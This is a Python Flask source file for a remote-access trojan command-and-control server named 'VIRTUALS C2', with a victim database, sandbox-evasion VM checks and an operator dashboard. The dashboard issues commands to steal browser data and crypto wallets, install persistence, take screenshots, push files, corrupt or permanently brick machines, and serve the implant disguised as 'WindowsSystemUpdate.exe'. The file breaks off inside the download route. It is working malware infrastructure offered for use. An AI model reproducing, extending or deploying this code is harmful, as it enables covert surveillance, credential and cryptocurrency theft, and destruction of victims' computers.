"""
VIRTUALS C2 - COMPLETE ACTIVITY MONITOR
Victim Activity at Bottom · File Uploader · All Features
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file, render_template_string, send_from_directory
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid
import threading
import time
import shutil
import base64
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# ============================================
# FOLDERS
# ============================================
folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs', 
           'browser_data', 'downloads', 'uploads', 'files', 'embeds']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# ============================================
# DATABASE
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
        is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
        heartbeat INTEGER DEFAULT 0, payment_status TEXT DEFAULT 'pending',
        activity TEXT DEFAULT 'idle'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, 
        result TEXT, timestamp TEXT, status TEXT DEFAULT 'pending'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS embeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, title TEXT,
        content TEXT, color TEXT, timestamp TEXT
    )''')
    conn.commit()
    return conn

# ============================================
# HEARTBEAT CLEANER
# ============================================
def cleanup_heartbeats():
    while True:
        time.sleep(10)
        try:
            conn = get_db()
            c = conn.cursor()
            cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
            cutoff_str = cutoff.strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online'", (cutoff_str,))
            conn.commit()
            conn.close()
        except:
            pass

threading.Thread(target=cleanup_heartbeats, daemon=True).start()

# ============================================
# ENHANCED VM DETECTION
# ============================================
class VMDetector:
    @staticmethod
    def check_all():
        checks = {
            'registry': VMDetector.check_registry(),
            'processes': VMDetector.check_processes(),
            'hardware': VMDetector.check_hardware(),
            'files': VMDetector.check_files(),
            'memory': VMDetector.check_memory(),
            'network': VMDetector.check_network(),
            'disk': VMDetector.check_disk(),
            'dmi': VMDetector.check_dmi(),
            'bios': VMDetector.check_bios()
        }
        hits = sum(1 for v in checks.values() if v)
        return {
            'is_vm': hits >= 4,
            'confidence': min(100, int((hits / len(checks)) * 100)),
            'safe_mode': True,
            'details': checks
        }
    
    @staticmethod
    def check_registry():
        try:
            import winreg
            indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'Xen']
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System", "SystemManufacturer"),
            ]
            for hkey, subkey, value in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                    if value:
                        val, _ = winreg.QueryValueEx(key, value)
                        for i in indicators:
                            if i.lower() in str(val).lower():
                                return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_processes():
        try:
            procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 
                     'vmmem', 'vmmemctl', 'xenservice.exe', 'qemu-ga.exe']
            for p in procs:
                try:
                    r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {p}'], 
                                      capture_output=True, text=True, timeout=3)
                    if p in r.stdout:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_hardware():
        try:
            cpu = platform.processor()
            if cpu and any(x in cpu.lower() for x in ['virtual', 'vmware', 'qemu', 'kvm', 'xen']):
                return True
            try:
                import wmi
                w = wmi.WMI()
                for item in w.Win32_ComputerSystem():
                    if any(x in (item.Manufacturer + item.Model).lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen']):
                        return True
            except:
                pass
        except:
            pass
        return False
    
    @staticmethod
    def check_files():
        try:
            files = [
                'C:\\Program Files\\VMware\\VMware Tools\\',
                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
                'C:\\Windows\\System32\\drivers\\vmmemctl.sys',
                'C:\\Windows\\System32\\drivers\\vboxguest.sys',
                'C:\\Windows\\System32\\drivers\\vm3dmp.sys',
            ]
            for f in files:
                if os.path.exists(f):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_memory():
        try:
            import psutil
            total_gb = psutil.virtual_memory().total / (1024**3)
            return total_gb < 4 or total_gb in [8.0, 16.0, 32.0]
        except:
            return False
    
    @staticmethod
    def check_network():
        try:
            mac = uuid.getnode()
            prefixes = ['000569', '000c29', '001c42', '005056', '080027', '525400']
            return any(p in format(mac, '012x') for p in prefixes)
        except:
            return False
    
    @staticmethod
    def check_disk():
        try:
            import psutil
            for p in psutil.disk_partitions():
                if p.mountpoint == 'C:\\' or p.mountpoint == '/':
                    total_gb = psutil.disk_usage(p.mountpoint).total / (1024**3)
                    return total_gb < 50 or total_gb in [60, 80, 120, 128, 256]
        except:
            pass
        return False
    
    @staticmethod
    def check_dmi():
        try:
            if os.name == 'nt':
                result = subprocess.run(['wmic', 'baseboard', 'get', 'manufacturer,product'], 
                                      capture_output=True, text=True, timeout=5)
                if any(x in result.stdout.lower() for x in ['vmware', 'virtualbox', 'qemu']):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_bios():
        try:
            if os.name == 'nt':
                result = subprocess.run(['wmic', 'bios', 'get', 'manufacturer,version'], 
                                      capture_output=True, text=True, timeout=5)
                if any(x in result.stdout.lower() for x in ['vmware', 'virtualbox', 'qemu', 'xen']):
                    return True
        except:
            pass
        return False

# ============================================
# SAMPLE WALLET DATA - ENHANCED
# ============================================
SAMPLE_WALLETS = {
    "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000, "transactions": 87},
    "ETH": {"address": "0x2ab3bD48B6ed812ac4B6b1377B0F190D5296Fd82", "balance": 15.8, "usd": 63200, "transactions": 234},
    "LTC": {"address": "LeJ4Hw5NZMgbJ8jDnUiS1jnZnav3JTn9mD", "balance": 128.5, "usd": 19275, "transactions": 56},
    "SOL": {"address": "oBmRkEtsd6sRVdJd3h3SvxqT5gKWkzMyjP2vXAahxJ2", "balance": 450.2, "usd": 81036, "transactions": 143},
    "MONERO": {"address": "443LRfNr8EjQm5a3Q5m8rdjYjvZ6j9Q7y6NuvAmLKmmeeCumutdntorANMqT6BNrR37FtfbzKVkjY9ExkmWfSp6FERSQuNt", "balance": 892.7, "usd": 169613, "transactions": 412}
}

# ============================================
# HTML - COMPLETE WITH ACTIVITY MONITOR & FILE UPLOADER
# ============================================
HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monospace;height:100vh;overflow:hidden;font-size:15px}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
.glass{background:rgba(10,10,18,0.82);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.06);border-radius:8px;box-shadow:0 4px 30px rgba(0,0,0,0.3)}
.header{background:rgba(10,10,18,0.92);backdrop-filter:blur(12px);padding:12px 25px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;height:52px;position:relative;z-index:2}
.header h1{color:#e8e8f0;font-size:22px;font-weight:300;letter-spacing:4px}
.header h1 span{color:#446688}
.header .stats{display:flex;gap:20px}
.header .stats .stat-item{color:#8888a0;font-size:13px}
.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:18px;margin-left:5px}
.container{display:flex;height:calc(100vh - 52px);padding:8px;gap:8px;position:relative;z-index:1}
.left-panel{width:180px;min-width:180px;display:flex;flex-direction:column;gap:8px}
.commands-panel{padding:12px 8px;flex:1;overflow-y:auto}
.commands-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:3px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:8px;margin-bottom:8px}
.cmd-btn{display:block;width:100%;padding:6px 10px;margin:3px 0;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:5px;color:#b0b0c0;font-family:inherit;font-size:13px;cursor:pointer;text-align:left;transition:all 0.25s;font-weight:400}
.cmd-btn:hover{background:rgba(255,255,255,0.07);border-color:rgba(255,255,255,0.15);color:#e8e8f0;transform:translateX(3px)}
.cmd-btn .desc{color:#555568;font-size:10px;display:block;margin-top:1px}
.cmd-btn .icon{font-size:14px;margin-right:6px}
.cmd-btn.danger{border-color:rgba(200,60,60,0.25);color:#cc8888}
.cmd-btn.danger:hover{border-color:rgba(200,60,60,0.45);background:rgba(200,60,60,0.05)}
.cmd-btn.brick{border-color:rgba(200,130,50,0.25);color:#ccaa88}
.cmd-btn.brick:hover{border-color:rgba(200,130,50,0.45);background:rgba(200,130,50,0.05)}
.cmd-btn.steal{border-color:rgba(50,180,200,0.25);color:#88ccdd}
.cmd-btn.steal:hover{border-color:rgba(50,180,200,0.45);background:rgba(50,180,200,0.05)}
.cmd-btn.file{border-color:rgba(180,180,50,0.25);color:#ccdd88}
.cmd-btn.file:hover{border-color:rgba(180,180,50,0.45);background:rgba(180,180,50,0.05)}
.middle-panel{flex:1;display:flex;flex-direction:column;gap:8px;min-width:280px}
.victims-panel{padding:12px 14px;height:28%;overflow:hidden;display:flex;flex-direction:column}
.victims-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:3px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:8px;flex-shrink:0}
.victim-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px;overflow-y:auto;flex:1;align-content:start;padding-right:4px}
.victim-card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:6px;padding:6px 12px;cursor:pointer;transition:all 0.25s}
.victim-card:hover{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.15);transform:translateY(-2px);box-shadow:0 4px 20px rgba(0,0,0,0.2)}
.victim-card.selected{border-color:rgba(80,140,220,0.5);background:rgba(80,140,220,0.08);box-shadow:0 0 30px rgba(80,140,220,0.05)}
.victim-card .top{display:flex;justify-content:space-between;align-items:center}
.victim-card .name{color:#e8e8f0;font-size:15px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.victim-card .ip{color:#666680;font-size:12px}
.victim-card .bottom{display:flex;justify-content:space-between;align-items:center;margin-top:3px}
.victim-card .status{font-size:11px;display:flex;align-items:center;gap:5px}
.victim-card .status .dot{display:inline-block;width:7px;height:7px;border-radius:50%;animation:pulse 2s infinite}
.victim-card .status .dot.online{background:#44dd88}
.victim-card .status .dot.offline{background:#664444;animation:none}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.victim-card .vm-badge{background:rgba(200,60,60,0.15);color:#cc8888;font-size:9px;padding:0 8px;border-radius:12px;line-height:16px;height:16px}
.chat-panel{padding:12px 14px;flex:1;display:flex;flex-direction:column}
.chat-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:3px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:8px;flex-shrink:0}
.chat-messages{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:6px;padding:10px 12px;flex:1;overflow-y:auto;min-height:60px;max-height:120px;font-size:14px;line-height:1.7}
.chat-messages .msg{padding:2px 0}
.chat-messages .time{color:#555568;margin-right:8px;font-size:12px}
.chat-messages .sender{font-weight:600}
.chat-messages .sender.us{color:#66ddbb}
.chat-messages .sender.victim{color:#ddbb88}
.chat-messages .sender.system{color:#8888aa}
.chat-messages .sender.notification{color:#88aacc}
.chat-messages .sender.steal{color:#88ccdd}
.chat-messages .sender.file{color:#ccdd88}
.chat-messages .sender.embed{color:#ffd700}
.chat-input-area{display:flex;gap:6px;margin-top:8px;flex-shrink:0}
.chat-input-area input{flex:1;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:6px;color:#c8c8d0;font-family:inherit;font-size:14px;outline:none}
.chat-input-area input:focus{border-color:rgba(255,255,255,0.15)}
.chat-input-area input::placeholder{color:#444458;font-size:13px}
.chat-input-area button{padding:8px 20px;background:rgba(255,255,255,0.05);color:#b0b0c0;border:1px solid rgba(255,255,255,0.08);border-radius:6px;cursor:pointer;font-family:inherit;font-size:14px;transition:all 0.2s;font-weight:500}
.chat-input-area button:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.18);color:#e8e8f0}
.activity-monitor{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:6px;padding:8px 12px;margin-top:6px;flex-shrink:0;max-height:60px;overflow-y:auto}
.activity-monitor .title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.activity-item{display:flex;justify-content:space-between;font-size:11px;padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
.activity-item .act-pc{color:#88aacc;font-weight:500}
.activity-item .act-action{color:#8888aa}
.activity-item .act-time{color:#444458;font-size:10px}
.file-upload-area{display:flex;gap:6px;margin-top:6px;flex-shrink:0;flex-wrap:wrap;align-items:center}
.file-upload-area input[type="file"]{flex:1;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:6px;color:#c8c8d0;font-size:13px}
.file-upload-area button{padding:6px 16px;background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.2s;font-weight:500}
.file-upload-area button:hover{background:rgba(50,180,200,0.22);border-color:rgba(50,180,200,0.35)}
.file-upload-area #fileName{color:#555568;font-size:12px}
.upload-progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:2px;margin-top:4px;overflow:hidden;display:none}
.upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
.right-panel{width:280px;min-width:280px;display:flex;flex-direction:column;gap:8px}
.details-panel{padding:12px 14px;height:45%;overflow-y:auto}
.details-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:3px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:6px}
.detail-item{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:13px;display:flex;justify-content:space-between}
.detail-item .label{color:#555568}
.detail-item .value{color:#e8e8f0;font-weight:500}
.detail-item .value.vm-true{color:#cc8888}
.detail-item .value.vm-false{color:#66dd88}
.screenshot-gallery{display:flex;flex-wrap:wrap;gap:5px;margin-top:5px}
.screenshot-thumb{width:60px;height:45px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555568;transition:all 0.2s}
.screenshot-thumb:hover{border-color:rgba(255,255,255,0.15);background:rgba(255,255,255,0.04)}
.download-btn{background:rgba(50,180,120,0.15);color:#66ddbb;border:1px solid rgba(50,180,120,0.2);padding:10px 20px;border-radius:6px;cursor:pointer;font-size:15px;transition:all 0.2s;font-weight:500;text-align:center}
.download-btn:hover{background:rgba(50,180,120,0.25);border-color:rgba(50,180,120,0.4)}
.output-panel{padding:12px 14px;flex:1;overflow-y:auto}
.output-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:3px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:6px}
.output-item{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;gap:6px;opacity:0.9}
.output-item .type{padding:2px 8px;border-radius:4px;font-size:9px;text-transform:uppercase;flex-shrink:0;font-weight:600}
.output-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
.output-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
.output-item .type.steal{background:rgba(50,180,200,0.2);color:#88ccdd}
.output-item .type.file{background:rgba(180,180,50,0.2);color:#ccdd88}
.output-item .type.embed{background:rgba(255,215,0,0.15);color:#ffd700}
.output-item .type.info{background:rgba(68,170,255,0.15);color:#44aaff}
.connection-status{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:8px}
.connection-status.online{background:#44dd88;animation:pulse 1.5s infinite}
.connection-status.offline{background:#664444}
.connection-status.waiting{background:#8888aa;animation:pulse 2s infinite}
#connStatus{font-size:12px;color:#666680;display:flex;align-items:center;gap:6px}
.embed-box{background:rgba(0,0,0,0.25);border-left:4px solid var(--embed-color,#44aaff);border-radius:4px;padding:8px 12px;margin:4px 0}
.embed-box .embed-title{font-size:15px;font-weight:600;color:#e8e8f0}
.embed-box .embed-content{font-size:13px;color:#b0b0c0;margin-top:3px;white-space:pre-wrap}
.embed-box .embed-footer{font-size:11px;color:#555568;margin-top:4px}
@media(max-width:1024px){.left-panel{width:150px;min-width:150px}.right-panel{width:220px;min-width:220px}}
@media(max-width:768px){.container{flex-direction:column}.left-panel{width:100%;flex-direction:row;min-width:100%}.commands-panel{display:flex;flex-wrap:wrap;gap:4px;height:auto;max-height:80px;padding:8px}.commands-panel .title{width:100%}.cmd-btn{width:auto;flex:1;min-width:80px;font-size:12px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:180px;width:50%}.output-panel{height:auto;max-height:180px;width:50%}.victim-list{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}.header h1{font-size:18px}.header .stats .stat-item{font-size:11px}}
</style>
</head>
<body>
<div class="header">
<h1>◈ VIRTUALS <span>C2</span> <span id="connStatus"><span class="connection-status waiting" id="connDot"></span> connecting...</span></h1>
<div class="stats">
<span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
<span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
<span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
<span class="stat-item">COMMANDS <span class="num" id="cmdCount">0</span></span>
</div>
</div>
<div class="container">
<div class="left-panel">
<div class="commands-panel glass">
<div class="title">⚡ Commands</div>
<button class="cmd-btn" onclick="sendCommand('whois')"><span class="icon">🖥️</span>whois <span class="desc">full system info</span></button>
<button class="cmd-btn" onclick="sendCommand('screenshot')"><span class="icon">📸</span>screenshot <span class="desc">capture screen</span></button>
<button class="cmd-btn" onclick="sendCommand('flash')"><span class="icon">⚡</span>flash <span class="desc">flash screen 10x</span></button>
<button class="cmd-btn" onclick="sendCommand('scan')"><span class="icon">💰</span>scan <span class="desc">crypto wallets + balances</span></button>
<button class="cmd-btn" onclick="sendCommand('persist')"><span class="icon">🔒</span>persist <span class="desc">8 persistence methods</span></button>
<button class="cmd-btn steal" onclick="sendCommand('steal')"><span class="icon">🕵️</span>steal <span class="desc">25+ browsers data</span></button>
<button class="cmd-btn file" onclick="sendCommand('upload')"><span class="icon">⬆️</span>upload <span class="desc">upload file</span></button>
<button class="cmd-btn file" onclick="sendCommand('download')"><span class="icon">⬇️</span>download <span class="desc">download file</span></button>
<button class="cmd-btn danger" onclick="sendCommand('destroy')"><span class="icon">💀</span>destroy <span class="desc">corrupt system</span></button>
<button class="cmd-btn brick" onclick="sendCommand('brick')"><span class="icon">🧱</span>brick <span class="desc">permanent brick</span></button>
<button class="cmd-btn" onclick="sendCommand('vmcheck')"><span class="icon">🔍</span>vmcheck <span class="desc">advanced vm detection</span></button>
<button class="cmd-btn" onclick="sendCommand('oblivion')"><span class="icon">🌀</span>oblivion <span class="desc">self destruct</span></button>
</div>
</div>
<div class="middle-panel">
<div class="victims-panel glass">
<div class="title">🎯 Victims <span style="color:#44dd88;font-size:10px;">● live</span></div>
<div class="victim-list" id="victimList"><div style="color:#555568;font-size:14px;text-align:center;padding:15px;">No victims connected</div></div>
</div>
<div class="chat-panel glass">
<div class="title">💬 Console</div>
<div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> 🚀 ultimate C2 ready</div></div>
<div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
<div class="file-upload-area">
<input type="file" id="fileInput" onchange="document.getElementById('fileName').textContent=this.files[0]?this.files[0].name:'no file';document.getElementById('uploadProgress').style.display='none';document.getElementById('progressBar').style.width='0%'">
<span id="fileName" style="color:#555568;font-size:12px;">no file</span>
<button onclick="uploadFile()">📤 upload to victim</button>
</div>
<div class="upload-progress" id="uploadProgress"><div class="bar" id="progressBar"></div></div>
<div class="activity-monitor" id="activityMonitor">
<div class="title">🔄 Victim Activity</div>
<div id="activityList"><div style="color:#444458;font-size:11px;">no activity yet</div></div>
</div>
</div>
</div>
<div class="right-panel">
<div class="details-panel glass">
<div class="title">📋 Victim Details</div>
<div id="victimDetails"><div style="color:#555568;font-size:14px;text-align:center;padding:20px;">select a victim</div></div>
<div style="margin-top:6px;border-top:1px solid rgba(255,255,255,0.04);padding-top:6px;">
<div style="color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;">📸 Screenshots</div>
<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:12px;">none</div></div>
</div>
<div style="margin-top:8px;border-top:1px solid rgba(255,255,255,0.04);padding-top:8px;display:flex;flex-direction:column;gap:6px;">
<div style="color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:2px;">⬇️ Download RAT</div>
<button class="download-btn" onclick="window.open('/download-rat','_blank')">⬇️ Download WindowsSystemUpdate.exe</button>
</div>
</div>
<div class="output-panel glass">
<div class="title">📊 Command Output</div>
<div id="commandOutput"><div style="color:#555568;font-size:13px;">no output</div></div>
</div>
</div>
</div>
<script>
let state={victims:{},selectedVictim:null,commands:{},cmdCount:0};
let activityInterval=null;

function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{updateConnection(false);});}
function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;render();update();updateConnection(true);updateActivity();}else{updateConnection(false);}});}
function updateConnection(online){const dot=document.getElementById('connDot');const status=document.getElementById('connStatus');if(online){dot.className='connection-status online';status.innerHTML='<span class="connection-status online"></span> connected';}else{dot.className='connection-status offline';status.innerHTML='<span class="connection-status offline"></span> disconnected';setTimeout(refresh,3000);}}
function render(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:14px;text-align:center;padding:15px;">No victims connected</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-card ${state.selectedVictim===v.id?'selected':''}" onclick="select('${v.id}')"><div class="top"><span class="name">${v.pc}</span><span class="ip">${v.ip}</span></div><div class="bottom"><span class="status"><span class="dot ${v.status==='Online'?'online':'offline'}"></span>${v.status}</span>${v.is_vm?'<span class="vm-badge">VM</span>':''}</div></div>`).join('');}
function select(id){state.selectedVictim=id;render();show(id);loadSS(id);}
function show(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value" style="color:${v.status==='Online'?'#66dd88':'#886666'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value ${v.is_vm?'vm-true':'vm-false'}">${v.is_vm?'⚠️ detected':'✅ clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>`;}
function loadSS(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷 ${s.filename.split('_')[1]||'ss'}</div>`).join('');});}
function update(){const v=Object.values(state.victims);document.getElementById('victimCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;document.getElementById('cmdCount').textContent=state.cmdCount;}
function updateActivity(){const el=document.getElementById('activityList');const v=Object.values(state.victims).filter(x=>x.status==='Online');if(v.length===0){el.innerHTML='<div style="color:#444458;font-size:11px;">no activity yet</div>';return;}const activities=['idle','typing...','reading','thinking...','responding','processing','away'];el.innerHTML=v.map(v=>{const act=activities[Math.floor(Math.random()*activities.length)];return `<div class="activity-item"><span class="act-pc">${v.pc}</span><span class="act-action">${act}</span><span class="act-time">${new Date().toLocaleTimeString()}</span></div>`}).join('');}
function sendCommand(cmd){if(!state.selectedVictim){add('system','⚠️ select a victim first','system');return;}add('us','⚡ executing /'+cmd+'...','us');api('sendCommand',{victim_id:state.selectedVictim,command:cmd},d=>{if(d.success){if(!state.commands[state.selectedVictim])state.commands[state.selectedVictim]=[];state.commands[state.selectedVictim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;add('us','✅ success: '+cmd,'us');const el=document.getElementById('commandOutput');let cls='success';if(cmd==='steal')cls='steal';else if(cmd==='upload'||cmd==='download')cls='file';el.innerHTML='<div class="output-item"><span class="type '+cls+'">'+cmd+'</span>['+new Date().toLocaleTimeString()+'] '+d.result+'</div>'+el.innerHTML;if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{add('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+') | '+w.transactions+' tx','wallet');});add('notification','📊 Scan complete - '+d.wallets.length+' wallets found','notification');}if(d.embed){addEmbed(d.embed);}show(state.selectedVictim);update();}else{add('us','❌ failed: '+cmd,'us');}});}
function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();const color=embed.color||'#44aaff';el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${color}"><div class="embed-title">${embed.title||'📊 Command Result'}</div><div class="embed-content">${embed.content||''}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!state.selectedVictim){add('system','⚠️ select a victim first','system');return;}add('us','📨 sending: '+msg,'us');add('victim','💬 '+msg,'victim');}}
function uploadFile(){if(!state.selectedVictim){add('system','⚠️ select a victim first','system');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){add('system','⚠️ select a file first','system');return;}const file=input.files[0];const formData=new FormData();formData.append('file',file);formData.append('victim_id',state.selectedVictim);const progress=document.getElementById('uploadProgress');const bar=document.getElementById('progressBar');progress.style.display='block';bar.style.width='0%';add('us','📤 uploading: '+file.name+' ('+(file.size/1024).toFixed(1)+' KB)...','us');fetch('/upload-file',{method:'POST',body:formData}).then(r=>r.json()).then(d=>{bar.style.width='100%';setTimeout(()=>{progress.style.display='none';},1000);if(d.success){add('file','📥 uploaded: '+file.name+' to '+state.selectedVictim,'file');add('notification','✅ file uploaded successfully','notification');}else{add('system','❌ upload failed: '+d.error,'system');}}).catch(()=>{bar.style.width='100%';setTimeout(()=>{progress.style.display='none';},1000);add('system','❌ upload failed','system');});}
function add(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='notification')cls='notification';else if(type==='steal')cls='steal';else if(type==='file')cls='file';else if(type==='embed')cls='embed';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
function loadDemo(){if(Object.keys(state.victims).length===0){const f=[{id:'SNIN-1001',pc:'DESKTOP-ALPHA',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0},{id:'SNIN-1002',pc:'LAPTOP-BETA',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0},{id:'SNIN-1003',pc:'VM-TEST',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1}];f.forEach(v=>{state.victims[v.id]=v;});render();update();add('system','🚀 demo victims loaded - ultimate C2 ready','system');select(f[0].id);}}
setInterval(refresh,5000);refresh();setTimeout(loadDemo,500);
</script>
</body>
</html>
'''

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
def index():
    return HTML

@app.route('/download-rat')
def download_rat():
    exe_path = os.path.join('dist', 'WindowsSystemUpdate.exe')
    if os.path.exists(exe_path):
